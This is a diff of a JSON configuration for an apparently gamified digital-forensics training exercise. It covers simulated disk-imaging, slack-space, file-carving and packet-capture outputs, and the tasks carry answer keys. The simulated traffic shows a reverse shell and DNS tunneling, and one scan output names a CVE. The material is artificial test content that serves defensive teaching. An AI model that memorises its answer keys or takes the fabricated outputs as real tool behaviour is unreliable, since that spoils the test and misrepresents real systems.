@@ -1,9 +1,9 @@
 {
   "file_system_forensic": {
     "id": "file_system_forensic",
-    "title": "File System Forensic",
-    "description": "Analyze storage devices and find the evidence",
-    "introduction": "A suspicious hard disk has been seized. You must follow proper forensic procedures: hash the original evidence, create a forensic copy, verify integrity, then examine the file system to find hidden evidence.",
+    "title": "File System Forensic Investigation",
+    "description": "Investigate a seized disk using slack space analysis, file carving, and metadata forensics",
+    "introduction": "A suspicious hard disk has been seized from an employee suspected of data exfiltration. The disk appears to have been wiped, but forensic analysis may reveal hidden evidence. You must follow proper forensic procedures: hash and image the original evidence, then investigate file system structures, analyze slack space for hidden data, recover deleted files through carving, identify disguised files using magic numbers, and reconstruct the timeline through metadata analysis.",
     "badge": "File System Forensic Expert",
     "interactableObjects": [
       "HD1-01_HD-1_0",
@@ -30,13 +30,79 @@
           "if=/dev/sdb of=/forensic/evidence.img": "Creating forensic image...\n  Source: /dev/sdb (500MB)\n  Destination: /forensic/evidence.img\n  Block size: 4096 bytes\n\n122880+0 records in\n122880+0 records out\n503316480 bytes (500 MB) copied, 2.34 s, 215 MB/s\n\n[✓] Forensic image created successfully at /forensic/evidence.img"
         },
         "output": "Usage: dd if=<source> of=<destination>\nCreates bit-by-bit copy for forensic analysis."
+      },
+      {
+        "name": "fsstat",
+        "description": "Display file system statistics and structure information",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/forensic/evidence.img": "FILE SYSTEM INFORMATION\n--------------------------------------------\nFile System Type: ext4\nVolume Name: EVIDENCE_DISK\nVolume ID: 0x4a3b2c1d\n\nMETADATA INFORMATION\n--------------------------------------------\nInode Range: 1 - 32768\nRoot Directory: 2\nFree Inodes: 31254\n\nCONTENT INFORMATION\n--------------------------------------------\nBlock Size: 4096 bytes\nBlock Range: 0 - 122879\nTotal Blocks: 122880\nFree Blocks: 45231\nTotal Clusters: 122880\n\n[!] Note: Free blocks may contain recoverable deleted data"
+        },
+        "output": "Usage: fsstat <image>\nDisplays detailed file system statistics for forensic analysis."
+      },
+      {
+        "name": "blkcat",
+        "description": "Display contents of disk blocks including slack space",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/forensic/evidence.img 1024": "Block 1024 - Slack Space Analysis\n--------------------------------------------\nAllocated to: secret_notes.txt (partial)\nFile ends at offset: 156\nSlack space begins at offset: 157\n\nSLACK SPACE CONTENT (hex dump):\n00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n000000a0: 45 58 46 49 4c 5f 43 4f  4d 50 4c 45 54 45 5f 32  |EXFIL_COMPLETE_2|\n000000b0: 30 32 34 00 00 00 00 00  00 00 00 00 00 00 00 00  |026.............|\n000000c0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n\n[!] Hidden data detected in slack space!",
+          "/forensic/evidence.img 2048": "Block 2048 - Slack Space Analysis\n--------------------------------------------\nAllocated to: readme.txt (partial)\nFile ends at offset: 89\nSlack space begins at offset: 90\n\nSLACK SPACE CONTENT (hex dump):\n00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n\n[i] No significant data found in this block's slack space."
+        },
+        "output": "Usage: blkcat <image> <block_number>\nDisplays raw block content including slack space for forensic analysis."
+      },
+      {
+        "name": "foremost",
+        "description": "File carving tool to recover deleted files from disk images",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "-t all -i /forensic/evidence.img -o /forensic/recovered": "Foremost version 1.5.7\nAudit File: /forensic/recovered/audit.txt\n\nProcessing: /forensic/evidence.img\n|████████████████████████████████████████| 100%\n\nRecovered Files Summary:\n--------------------------------------------\nPDF files: 2\n  - 00000156.pdf (confidential_report.pdf) - Deleted: 2026-10-15 04:12\n  - 00000892.pdf (employee_data.pdf) - Deleted: 2026-10-14 23:45\n\nZIP files: 1\n  - 00001024.zip (backup.zip) - Deleted: 2026-10-15 04:13\n\nJPG files: 1\n  - 00002048.jpg (screenshot.jpg) - Deleted: 2026-10-15 04:10\n\n[✓] 4 files recovered to /forensic/recovered/\n[!] Check audit.txt for detailed carving report"
+        },
+        "output": "Usage: foremost -t <type> -i <image> -o <output_dir>\nCarves files from disk images based on headers/footers.\nTypes: all, pdf, jpg, zip, doc, exe"
+      },
+      {
+        "name": "xxd",
+        "description": "Create hex dump of file to examine magic numbers and file signatures",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/mnt/evidence/image.jpg": "00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............\n00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......\n00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................\n\n[!] WARNING: File extension is .jpg but magic bytes are 'MZ'\n[!] This indicates a Windows EXECUTABLE (PE format), not a JPEG image!\n[!] Expected JPEG magic: FF D8 FF\n[!] Found: 4D 5A (MZ header = executable)",
+          "/mnt/evidence/document.pdf": "00000000: 2550 4446 2d31 2e34 0a25 e2e3 cfd3 0a31  %PDF-1.4.%.....1\n00000010: 2030 206f 626a 0a3c 3c2f 5479 7065 2f43  .0.obj.<</Type/C\n\n[✓] File signature matches extension: PDF document",
+          "/mnt/evidence/secret_notes.txt": "00000000: 4d65 6574 696e 6720 7769 7468 2063 6f6e  Meeting.with.con\n00000010: 7461 6374 2061 7420 3130 3a30 3020 504d  tact.at.10:00.PM\n\n[✓] File signature matches extension: Plain text file",
+          "-l 64 /mnt/evidence/image.jpg": "00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............\n00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......\n00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................\n\n[!] Magic Number Analysis:\n    Found: 4D 5A (0x4D5A)\n    Signature: MZ Header\n    True Type: Windows Executable (PE/EXE format)\n    Disguised As: JPEG Image (.jpg extension)"
+        },
+        "output": "Usage: xxd [options] <file>\nCreates hex dump to analyze file signatures and magic numbers.\nOptions: -l <length> limits output bytes"
+      },
+      {
+        "name": "stat",
+        "description": "Display detailed file metadata including timestamps and ownership",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/mnt/evidence/suspicious.log": "  File: /mnt/evidence/suspicious.log\n  Size: 892 bytes\n  Type: regular file\n  \nOwnership:\n  Owner: jsmith (UID: 1001)\n  Group: employees (GID: 100)\n  \nPermissions: -rw-r----- (0640)\n  \nTimestamps:\n  Access: 2026-10-15 03:47:21.000000000 +0000\n  Modify: 2026-10-15 03:45:34.000000000 +0000\n  Change: 2026-10-15 03:45:34.000000000 +0000\n   Birth: 2026-10-15 03:42:10.000000000 +0000\n\nInode: 15234\nLinks: 1\nBlock Size: 4096\nBlocks Allocated: 8",
+          "/mnt/evidence/image.jpg": "  File: /mnt/evidence/image.jpg\n  Size: 45056 bytes\n  Type: regular file\n  \nOwnership:\n  Owner: jsmith (UID: 1001)\n  Group: employees (GID: 100)\n  \nPermissions: -rwxr-xr-x (0755)\n  \nTimestamps:\n  Access: 2026-10-15 04:05:12.000000000 +0000\n  Modify: 2026-10-15 04:02:45.000000000 +0000\n  Change: 2026-10-15 04:02:45.000000000 +0000\n   Birth: 2026-10-15 04:01:30.000000000 +0000\n\n[!] WARNING: Executable permissions on image file is suspicious!",
+          "/mnt/evidence/secret_notes.txt": "  File: /mnt/evidence/secret_notes.txt\n  Size: 156 bytes\n  Type: regular file\n  \nOwnership:\n  Owner: jsmith (UID: 1001)\n  Group: employees (GID: 100)\n  \nPermissions: -rw------- (0600)\n  \nTimestamps:\n  Access: 2026-10-15 03:50:00.000000000 +0000\n  Modify: 2026-10-15 03:48:22.000000000 +0000\n  Change: 2026-10-15 03:48:22.000000000 +0000\n   Birth: 2026-10-15 03:40:15.000000000 +0000"
+        },
+        "output": "Usage: stat <file>\nDisplays detailed file metadata for forensic timeline reconstruction."
+      },
+      {
+        "name": "fls",
+        "description": "List files and directories in a disk image including deleted entries",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "-rd /forensic/evidence.img": "Listing files (including deleted) from /forensic/evidence.img:\n\nd/d     2:      .\nd/d     2:      ..\nr/r     15234:  suspicious.log\nr/r     15235:  secret_notes.txt\nr/r     15236:  image.jpg\nr/r     15237:  document.pdf\nr/r *   15238:  confidential_report.pdf (deleted)\nr/r *   15239:  employee_data.pdf (deleted)\nr/r *   15240:  backup.zip (deleted)\nr/r *   15241:  screenshot.jpg (deleted)\n\n[*] = Deleted file (may be recoverable)\n[!] 4 deleted files detected - use foremost for recovery"
+        },
+        "output": "Usage: fls [options] <image>\nLists files and directories including deleted entries.\nOptions: -r recursive, -d show deleted"
       }
     ],
     "tasks": [
       {
         "id": "fs_task_1",
-        "title": "Connect the hard disk to the workstation",
-        "details": "Click on the hard disk to physically connect it to the forensic PC",
+        "title": "Connect the seized hard disk",
+        "details": "Click on the hard disk to physically connect it to the forensic workstation. This disk was seized from an employee suspected of data exfiltration.",
         "points": 10,
         "checkType": "interaction",
         "interactionTarget": "HD1-01_HD-1_0",
@@ -46,9 +112,10 @@
           "deviceType": "disk",
           "message": " Hard disk connected as /dev/sdb\nUse 'lsblk' to display available devices",
           "mountContent": {
-            "suspicious.log": "2024-10-15 03:45:12 - Unauthorized access attempt\n2024-10-15 03:45:34 - Login from 192.168.1.50\n2024-10-15 03:47:21 - File system modified: /etc/shadow\npassword: forensic2024",
-            "deleted_files.txt": "Recovered files:\n- secret_document.pdf (deleted 2024-10-15 04:12)\n- evidence.docx (deleted 2024-10-15 04:13)",
-            "system_info.txt": "System: Ubuntu 22.04 LTS\nKernel: 5.15.0-89-generic\nLast boot: 2024-10-15 03:30:00"
+            "suspicious.log": "2026-10-15 03:42:10 - Session started by jsmith\n2026-10-15 03:45:12 - Unauthorized access attempt from 192.168.1.50\n2026-10-15 03:45:34 - Successful login from 192.168.1.50\n2026-10-15 03:47:21 - File accessed: /data/confidential_report.pdf\n2026-10-15 03:48:55 - External USB device connected\n2026-10-15 04:02:45 - File renamed: malware.exe -> image.jpg\n2026-10-15 04:05:00 - Data transfer initiated\n2026-10-15 04:12:00 - File deleted: confidential_report.pdf\n2026-10-15 04:13:00 - File deleted: backup.zip\n2026-10-15 04:15:22 - Session ended",
+            "secret_notes.txt": "Meeting with contact at 10:00 PM\nDrop location: parking garage B\nPayment: 50k BTC\nTarget files secured",
+            "image.jpg": "[BINARY EXECUTABLE DATA - DISGUISED AS IMAGE]",
+            "document.pdf": "[LEGITIMATE PDF DOCUMENT]"
           }
         },
         "hintCost": 2,
@@ -58,127 +125,255 @@
       },
       {
         "id": "fs_task_2",
-        "title": "List connected devices",
-        "details": "Use 'lsblk' to see available disks",
+        "title": "Identify the device partition",
+        "details": "Use 'lsblk' to list connected block devices. Enter the partition name of the seized disk (e.g., sdb1).",
         "points": 15,
-        "checkType": null,
+        "checkType": "flag",
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 3,
-        "hasHint": false,
-        "checkCommand": "lsblk",
-        "checkArgs": []
+        "hasHint": true,
+        "hint": "Look for the newly connected device in the lsblk output. The partition will have a number suffix.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "sdb1"
       },
       {
         "id": "fs_task_3",
-        "title": "Calculate SHA256 hash of the original evidence",
-        "details": "Before any analysis, compute a cryptographic hash of the original disk to establish integrity. Use 'sha256sum /dev/sdb'",
+        "title": "Hash the original evidence",
+        "details": "Before any analysis, compute a SHA256 hash of the original disk to establish integrity for chain of custody. Use 'sha256sum /dev/sdb'",
         "points": 20,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 4,
-        "hasHint": true,
-        "hint": "Hash the original device with: sha256sum /dev/sdb",
+        "hasHint": false,
         "checkCommand": "sha256sum",
-        "checkArgs": ["/dev/sdb"]
+        "checkArgs": [
+          "/dev/sdb"
+        ]
       },
       {
         "id": "fs_task_4",
-        "title": "Create a forensic copy using dd",
-        "details": "Never work on original evidence! Create a bit-by-bit forensic image. Use 'dd if=/dev/sdb of=/forensic/evidence.img'",
+        "title": "Create forensic image",
+        "details": "Never work on original evidence! Create a bit-by-bit forensic image using dd. Use 'dd if=/dev/sdb of=/forensic/evidence.img'",
         "points": 25,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 5,
-        "hasHint": true,
-        "hint": "Create forensic copy: dd if=/dev/sdb of=/forensic/evidence.img",
+        "hasHint": false,
         "checkCommand": "dd",
-        "checkArgs": ["if=/dev/sdb", "of=/forensic/evidence.img"]
+        "checkArgs": [
+          "if=/dev/sdb",
+          "of=/forensic/evidence.img"
+        ]
       },
       {
         "id": "fs_task_5",
-        "title": "Verify forensic copy integrity",
-        "details": "Hash the forensic image and compare with the original hash. They must match! Use 'sha256sum /forensic/evidence.img'",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": true,
-        "hint": "Verify copy integrity: sha256sum /forensic/evidence.img",
-        "checkCommand": "sha256sum",
-        "checkArgs": ["/forensic/evidence.img"]
-      },
-      {
-        "id": "fs_task_6",
-        "title": "Mount the forensic copy read-only",
-        "details": "Mount the forensic image (not original!) in read-only mode to prevent accidental modification. Use 'mount -o ro /forensic/evidence.img /mnt/evidence'",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": true,
-        "hint": "Mount read-only: mount -o ro /forensic/evidence.img /mnt/evidence",
-        "checkCommand": "mount",
-        "checkArgs": ["-o", "ro", "/forensic/evidence.img", "/mnt/evidence"]
-      },
-      {
-        "id": "fs_task_7",
-        "title": "Explore the contents",
-        "details": "Use 'ls' to see files on the disk",
-        "points": 15,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 3,
-        "hasHint": true,
-        "checkCommand": "ls",
-        "checkArgs": [
-          "/mnt/evidence"
-        ],
-        "hint": "use 'ls /mnt/evidence/'"
-      },
-      {
-        "id": "fs_task_8",
-        "title": "Search for suspicious files",
-        "details": "Use 'cat /mnt/evidence/suspicious.log' to read the log",
+        "title": "Verify image integrity",
+        "details": "Hash the forensic image and verify it matches the original. Use 'sha256sum /forensic/evidence.img'",
         "points": 20,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 4,
         "hasHint": false,
-        "checkCommand": "cat",
+        "checkCommand": "sha256sum",
         "checkArgs": [
-          "/mnt/evidence/suspicious.log"
+          "/forensic/evidence.img"
+        ]
+      },
+      {
+        "id": "fs_task_6",
+        "title": "Analyze file system structure",
+        "details": "Use 'fsstat /forensic/evidence.img' to examine the file system structure. What file system type is this disk formatted with? Enter only the file system name (lowercase).",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Look for 'File System Type:' in the fsstat output.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "ext4"
+      },
+      {
+        "id": "fs_task_7",
+        "title": "Determine total clusters",
+        "details": "From the fsstat output, what is the total number of clusters (blocks) on this disk? Enter only the number.",
+        "points": 15,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 3,
+        "hasHint": true,
+        "hint": "Look for 'Total Clusters:' or 'Total Blocks:' in the fsstat output.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "122880"
+      },
+      {
+        "id": "fs_task_8",
+        "title": "Mount evidence read-only",
+        "details": "Mount the forensic image in read-only mode to prevent accidental modification. Use 'mount -o ro /forensic/evidence.img /mnt/evidence'",
+        "points": 20,
+        "checkType": null,
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": false,
+        "checkCommand": "mount",
+        "checkArgs": [
+          "-o",
+          "ro",
+          "/forensic/evidence.img",
+          "/mnt/evidence"
         ]
       },
       {
         "id": "fs_task_9",
-        "title": "Search for password in the log",
-        "details": "Use 'grep password /mnt/evidence/suspicious.log'",
+        "title": "List files including deleted",
+        "details": "Use 'fls -rd /forensic/evidence.img' to list all files including deleted entries. How many deleted files are detected? Enter only the number.",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Count the entries marked with * (asterisk) in the fls output.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "4"
+      },
+      {
+        "id": "fs_task_10",
+        "title": "Investigate slack space",
+        "details": "Deleted data may hide in slack space. Use 'blkcat /forensic/evidence.img 1024' to examine block 1024's slack space. What hidden message did you find? Enter the exact string.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "Look at the ASCII representation on the right side of the hex dump for readable text.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "EXFIL_COMPLETE_2026"
+      },
+      {
+        "id": "fs_task_11",
+        "title": "Recover deleted files",
+        "details": "Use file carving to recover deleted files. Run 'foremost -t all -i /forensic/evidence.img -o /forensic/recovered'. What is the name of the first recovered PDF file that was deleted?",
         "points": 25,
-        "checkType": null,
+        "checkType": "flag",
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 5,
-        "hasHint": false,
-        "checkCommand": "grep",
-        "checkArgs": [
-          "password",
-          "/mnt/evidence/suspicious.log"
-        ]
+        "hasHint": true,
+        "hint": "Check the foremost output for recovered PDF files and their original names.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "confidential_report.pdf"
+      },
+      {
+        "id": "fs_task_12",
+        "title": "Determine deletion time",
+        "details": "From the foremost recovery output, when was confidential_report.pdf deleted? Enter the timestamp in format: YYYY-MM-DD HH:MM",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Look at the 'Deleted:' timestamp next to the file in the foremost output.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "2026-10-15 04:12"
+      },
+      {
+        "id": "fs_task_13",
+        "title": "Analyze suspicious file magic bytes",
+        "details": "The file 'image.jpg' looks suspicious. Use 'xxd /mnt/evidence/image.jpg' to examine its magic bytes. What is the TRUE file type? Enter: executable, pdf, zip, or jpeg",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "Magic bytes 4D 5A (MZ) at the start indicate a Windows executable. Compare to expected JPEG magic: FF D8 FF.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "executable"
+      },
+      {
+        "id": "fs_task_14",
+        "title": "Identify file owner",
+        "details": "Use 'stat /mnt/evidence/suspicious.log' to examine file metadata. Who is the owner of this file? Enter only the username.",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Look for the 'Owner:' field in the stat output.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "jsmith"
+      },
+      {
+        "id": "fs_task_15",
+        "title": "Determine last modification time",
+        "details": "From the stat output of suspicious.log, what was the last modification time? Enter in format: HH:MM:SS",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Look for the 'Modify:' timestamp in the stat output.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "03:45:34"
+      },
+      {
+        "id": "fs_task_16",
+        "title": "Find attacker IP",
+        "details": "Read the suspicious.log file using 'cat /mnt/evidence/suspicious.log'. What IP address successfully logged in to the system?",
+        "points": 25,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 5,
+        "hasHint": true,
+        "hint": "Look for 'Successful login from' in the log file.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "192.168.1.50"
+      },
+      {
+        "id": "fs_task_17",
+        "title": "Identify evidence of data exfiltration",
+        "details": "Review all evidence gathered. What file was renamed to disguise the malware? Enter the original filename.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "Check the suspicious.log for any 'File renamed' entries.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "malware.exe"
       }
     ]
   },
   "network_forensic": {
     "id": "network_forensic",
-    "title": "Network Forensic",
-    "description": "Analyze network traffic and system logs",
-    "introduction": "A server has been compromised. You need to analyze authentication logs and network traffic to identify the attacker. First, you must trace the signal to locate the server, then follow forensic best practices before analysis.",
+    "title": "Network Forensic Investigation",
+    "description": "Investigate a network breach using traffic analysis, log correlation, and protocol forensics to reconstruct an APT-style intrusion",
+    "introduction": "At 02:30 AM, Nephilim Financial Services' Intrusion Detection System triggered a critical alert: anomalous encrypted outbound traffic was detected from their core server (10.0.0.5). The traffic pattern matched known DNS tunneling techniques used for data exfiltration. By the time the SOC team investigated, the suspicious connections had ceased — but the damage may already be done. Your forensic team has been called in to investigate the potential breach. Threat intelligence suggests this may be linked to APT-41, codenamed 'Shadow Pulse' — a group known for targeting financial institutions through brute-force entry, privilege escalation, and covert exfiltration channels. You must trace the intrusion path, preserve and analyze the network evidence, and reconstruct the full scope of the attack. Remember: hash before you analyze, work on copies, and follow every lead.",
     "badge": "Network Forensic Expert",
     "interactableObjects": [
       "Server",
@@ -187,45 +382,74 @@
     "customCommands": [
       {
         "name": "trace-connection",
-        "description": "Trace signal to remote server",
+        "description": "Trace signal to locate the compromised server",
         "type": "minigame",
         "gameType": "signal-tracing",
-        "output": "[*] Initiating Network Traffic Analysis... [TARGET: Identify C2 IP Address]",
-        "onSuccess": "Trace Complete. Target IP Identified: 10.0.0.5. Use 'nmap 10.0.0.5' to scan the target.",
+        "output": "[*] Initiating Network Traffic Analysis... [TARGET: Identify compromised server]",
+        "onSuccess": "Trace Complete. Compromised server identified: 10.0.0.5 (nephilim-srv). Use 'nmap 10.0.0.5' to enumerate services.",
         "nextTask": "scan-target"
       },
       {
         "name": "nmap",
-        "description": "Network exploration tool and security / port scanner",
-        "type": "command",
-        "output": "Scanning 10.0.0.5...\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nVulnerability detected on port 22 (SSH-2.0-OpenSSH_7.6p1)."
-      },
-      {
-        "name": "sha256sum",
-        "description": "Compute SHA256 hash of files for integrity verification",
+        "description": "Network scanner — enumerate ports and services on target hosts",
         "type": "command",
         "requiresArgs": true,
         "validArgs": {
-          "/var/log/network/*": "SHA256(/var/log/network/auth.log) = 8f14e45fceea167a5a36dedd4bea2543e4c4e5a6b7c8d9e0f1a2b3c4d5e6f7a8\nSHA256(/var/log/network/network.pcap) = 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3\nSHA256(/var/log/network/firewall.log) = 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n\n[✓] Hashes recorded for chain of custody documentation."
+          "10.0.0.5": "Starting Nmap 7.94 ( https://nmap.org )\nScanning nephilim-srv (10.0.0.5)...\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3\n80/tcp  open  http     Apache httpd 2.4.29\n443/tcp open  https    Apache httpd 2.4.29 (SSL)\n\nOS: Ubuntu 18.04 LTS\nUptime: 127 days\n\n[!] VULNERABILITY: OpenSSH 7.6p1 is outdated and vulnerable to user enumeration (CVE-2018-15473)\n[!] SSH allows password authentication — potential brute-force vector",
+          "-sV 10.0.0.5": "Starting Nmap 7.94 ( https://nmap.org )\nScanning nephilim-srv (10.0.0.5) with version detection...\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))\n443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n[!] VULNERABILITY: OpenSSH 7.6p1 — CVE-2018-15473 (Username Enumeration)\n[!] SSH password authentication enabled — brute-force risk"
+        },
+        "output": "Usage: nmap [options] <target IP>\nNetwork exploration tool and port scanner.\nOptions: -sV (version detection), -sC (default scripts)"
+      },
+      {
+        "name": "sha256sum",
+        "description": "Compute SHA256 hash for forensic integrity verification",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/var/log/network/*": "Computing hashes for chain of custody...\n\nSHA256(/var/log/network/auth.log)     = a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2\nSHA256(/var/log/network/firewall.log) = b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3\nSHA256(/var/log/network/access.log)   = c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4\nSHA256(/var/log/network/capture.pcap) = d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5\n\n[✓] Hashes recorded for chain of custody documentation.\n[!] Record these values — any change to evidence files will produce different hashes."
         },
         "output": "Usage: sha256sum <file(s)>\nComputes cryptographic hash for forensic integrity verification."
       },
       {
-        "name": "cp",
-        "description": "Copy files or directories",
+        "name": "tcpdump",
+        "description": "Packet analyzer — read and filter network capture files",
         "type": "command",
         "requiresArgs": true,
         "validArgs": {
-          "-r /var/log/network /forensic/logs": "Creating forensic working copies...\n  '/var/log/network/auth.log' -> '/forensic/logs/auth.log'\n  '/var/log/network/network.pcap' -> '/forensic/logs/network.pcap'\n  '/var/log/network/firewall.log' -> '/forensic/logs/firewall.log'\n\n[✓] Working copies created in /forensic/logs/\n[!] Original evidence preserved - analysis will use copies."
+          "-r /forensic/logs/capture.pcap": "reading from file /forensic/logs/capture.pcap, link-type EN10MB\n\n02:16:10.001 IP 10.0.0.5.45678 > 192.168.1.50.4444: Flags [S], seq 0, win 65535\n02:16:10.045 IP 192.168.1.50.4444 > 10.0.0.5.45678: Flags [S.], seq 0, ack 1, win 65535\n02:16:10.046 IP 10.0.0.5.45678 > 192.168.1.50.4444: Flags [.], ack 1, win 65535\n02:18:00.112 IP 10.0.0.5.55020 > 10.0.0.12.22: Flags [S], seq 0, win 65535\n02:18:00.145 IP 10.0.0.12.22 > 10.0.0.5.55020: Flags [S.], seq 0, ack 1, win 65535\n02:25:00.201 IP 10.0.0.5.41022 > 203.0.113.66.443: Flags [S], seq 0, win 65535\n02:25:15.330 IP 10.0.0.5.52001 > 203.0.113.66.53: UDP, length 187\n02:25:15.890 IP 203.0.113.66.53 > 10.0.0.5.52001: UDP, length 64\n02:25:16.440 IP 10.0.0.5.52002 > 203.0.113.66.53: UDP, length 245\n02:25:16.910 IP 203.0.113.66.53 > 10.0.0.5.52002: UDP, length 64\n02:25:17.550 IP 10.0.0.5.52003 > 203.0.113.66.53: UDP, length 198\n...(truncated — 847 DNS packets to 203.0.113.66)\n\n[!] Suspicious: 847 DNS queries to single external host 203.0.113.66\n[!] Suspicious: Reverse shell connection on port 4444\n\n1423 packets captured",
+          "-r /var/log/network/capture.pcap": "reading from file /var/log/network/capture.pcap, link-type EN10MB\n\n02:16:10.001 IP 10.0.0.5.45678 > 192.168.1.50.4444: Flags [S], seq 0, win 65535\n02:16:10.045 IP 192.168.1.50.4444 > 10.0.0.5.45678: Flags [S.], seq 0, ack 1, win 65535\n02:16:10.046 IP 10.0.0.5.45678 > 192.168.1.50.4444: Flags [.], ack 1, win 65535\n02:18:00.112 IP 10.0.0.5.55020 > 10.0.0.12.22: Flags [S], seq 0, win 65535\n02:18:00.145 IP 10.0.0.12.22 > 10.0.0.5.55020: Flags [S.], seq 0, ack 1, win 65535\n02:25:00.201 IP 10.0.0.5.41022 > 203.0.113.66.443: Flags [S], seq 0, win 65535\n02:25:15.330 IP 10.0.0.5.52001 > 203.0.113.66.53: UDP, length 187\n02:25:15.890 IP 203.0.113.66.53 > 10.0.0.5.52001: UDP, length 64\n02:25:16.440 IP 10.0.0.5.52002 > 203.0.113.66.53: UDP, length 245\n02:25:16.910 IP 203.0.113.66.53 > 10.0.0.5.52002: UDP, length 64\n02:25:17.550 IP 10.0.0.5.52003 > 203.0.113.66.53: UDP, length 198\n...(truncated — 847 DNS packets to 203.0.113.66)\n\n[!] Suspicious: 847 DNS queries to single external host 203.0.113.66\n[!] Suspicious: Reverse shell connection on port 4444\n\n1423 packets captured"
         },
-        "output": "Usage: cp [-r] <source> <destination>\nCopies files/directories for forensic analysis."
+        "output": "Usage: tcpdump -r <pcap_file> [filter]\nRead and analyze packet capture files.\nFilters: host <ip>, port <port>, tcp, udp"
+      },
+      {
+        "name": "tshark",
+        "description": "Terminal-based Wireshark — deep packet inspection and protocol analysis",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
